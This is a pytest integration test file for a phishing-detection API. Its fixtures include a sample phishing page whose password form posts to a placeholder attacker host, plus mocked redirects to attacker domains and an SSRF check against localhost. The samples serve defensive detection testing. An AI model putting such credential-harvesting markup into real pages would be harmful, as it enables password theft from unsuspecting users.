"""
Integration tests for the coordinated multi-stage phishing investigation API.
Tests end-to-end /investigate and /correlate workflows, request size limits (413),
and error handling using mocked network interactions.
"""

from unittest.mock import MagicMock, patch
import pytest
import requests
from src.api import app


@pytest.fixture
def client():
    app.config["TESTING"] = True
    with app.test_client() as client:
        yield client


def create_mock_response(status_code: int, url: str, location: str | None = None):
    resp = MagicMock(spec=requests.Response)
    resp.status_code = status_code
    resp.url = url
    resp.headers = {"Location": location} if location else {}
    return resp


@patch("src.features.fetch_html")
@patch("src.correlation_agent.requests.Session")
def test_investigate_coordinated_benign_page(mock_session_cls, mock_fetch_html, client):
    """
    Test end-to-end /investigate endpoint on a benign page:
    URL model, Webpage agent, and Behaviour agent all report clean signals.
    """
    normal_html = """
    <html>
        <body>
            <form action="/auth/login" method="post">
                <input type="text" name="user">
                <input type="password" name="pass">
            </form>
        </body>
    </html>
    """
    mock_fetch_html.return_value = normal_html

    mock_session = MagicMock()
    mock_session.get.return_value = create_mock_response(200, "https://apex-university.example/login")
    mock_session_cls.return_value = mock_session

    payload = {
        "url": "https://apex-university.example/login",
        "html": normal_html,
        "include_behaviour": True
    }

    response = client.post("/investigate", json=payload)
    assert response.status_code == 200
    data = response.get_json()

    assert data["agent"] == "Evidence Correlation Agent"
    assert data["overall_risk"] == "low"
    assert data["confidence"] == "high"
    assert "agent_results" in data
    assert data["agent_results"]["url_analysis"] is not None
    assert data["agent_results"]["webpage_analysis"] is not None
    assert data["agent_results"]["behaviour_analysis"] is not None


@patch("src.features.fetch_html")
@patch("src.correlation_agent.requests.Session")
def test_investigate_coordinated_attack_page(mock_session_cls, mock_fetch_html, client):
    """
    Test end-to-end /investigate endpoint on a multi-indicator phishing page:
    External credential form, protocol downgrade, and suspicious elements.
    """
    phish_html = """
    <html>
        <head><script src="http://untrusted.example/key.js"></script></head>
        <body>
            <form action="https://data-thief.attacker.example/steal" method="post">
                <input type="password" name="password">
            </form>
            <iframe src="https://tracker.example/pixel"></iframe>
        </body>
    </html>
    """
    mock_fetch_html.return_value = phish_html

    mock_session = MagicMock()
    mock_session.get.side_effect = [
        create_mock_response(302, "http://phish-site.example/login", "http://redirect.attacker.example/form"),
        create_mock_response(200, "http://redirect.attacker.example/form")
    ]
    mock_session_cls.return_value = mock_session

    payload = {
        "url": "http://phish-site.example/login",
        "html": phish_html,
        "include_behaviour": True
    }

    response = client.post("/investigate", json=payload)
    assert response.status_code == 200
    data = response.get_json()

    assert data["agent"] == "Evidence Correlation Agent"
    assert data["overall_risk"] == "high"
    assert data["risk_score"] >= 0.60
    assert len(data["supporting_indicators"]) >= 1
    assert any("credential" in r.lower() for r in data["reasons"])


def test_investigate_request_size_limit_413(client):
    """
    Test that request payloads exceeding MAX_CONTENT_LENGTH (2MB)
    trigger the custom 413 error handler.
    """
    oversized_html = "A" * (2 * 1024 * 1024 + 1024)  # > 2MB
    payload = {
        "url": "https://example.com",
        "html": oversized_html
    }
    response = client.post("/investigate", json=payload)
    assert response.status_code == 413
    assert "Payload exceeds maximum allowed size" in response.get_json().get("error", "")


def test_investigate_invalid_inputs(client):
    """Test input validation for /investigate endpoint."""
    # Missing URL
    resp1 = client.post("/investigate", json={"html": "<p>hi</p>"})
    assert resp1.status_code == 400

    # Invalid URL format
    resp2 = client.post("/investigate", json={"url": "not-a-valid-url"})
    assert resp2.status_code == 400

    # Invalid HTML type
    resp3 = client.post("/investigate", json={"url": "https://example.com", "html": 12345})
    assert resp3.status_code == 400


def test_independent_endpoints_coexist(client):
    """
    Verify that all individual component endpoints remain functional and independent:
    - /scan
    - /analyze-webpage
    - /analyze-behaviour
    - /correlate
    - /investigate
    """
    # 1. /analyze-webpage independent call
    resp_web = client.post("/analyze-webpage", json={"html": "<h1>Test</h1>", "url": "https://example.com"})
    assert resp_web.status_code == 200
    assert resp_web.get_json()["agent"] == "Webpage Analysis Agent"

    # 2. /analyze-behaviour independent call (SSRF blocked test)
    resp_beh = client.post("/analyze-behaviour", json={"url": "http://127.0.0.1:8000"})
    assert resp_beh.status_code == 200
    assert resp_beh.get_json()["agent"] == "Behaviour Analysis Agent"

    # 3. /correlate independent call
    resp_corr = client.post("/correlate", json={"url": "https://example.com", "url_analysis": {"label": "legit", "score": 0.05}})
    assert resp_corr.status_code == 200
    assert resp_corr.get_json()["agent"] == "Evidence Correlation Agent"
